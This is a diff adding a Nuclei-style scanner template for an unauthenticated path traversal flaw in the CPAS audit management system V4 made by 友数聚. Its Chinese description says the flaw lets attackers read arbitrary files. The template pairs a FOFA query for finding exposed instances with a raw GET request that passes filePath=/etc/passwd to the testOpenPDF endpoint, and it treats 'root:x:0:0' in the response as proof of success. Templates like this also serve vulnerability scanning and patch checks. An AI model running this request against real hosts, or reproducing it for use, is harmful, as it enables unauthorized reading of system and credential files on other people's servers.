@@ -1,0 +1,26 @@
+id: youshuju-cpas-v4-testopenpdf-file-read
+
+info:
+  name: "友数聚CPAS审计管理系统V4 testOpenPDF 文件路径遍历漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/cpasm4/static/cap/font/iconfont.css"
+      reference: 未授权攻击者可通过构造恶意路径参数突破目录限制，读取系统任意文件内容，导致敏感配置信息与业务数据泄露。
+  tags: 友数聚CPAS审计管理系统V4
+
+http:
+- raw:
+  - |
+    GET /cpasm4/iWebPdf/testOpenPDF?filePath=/etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
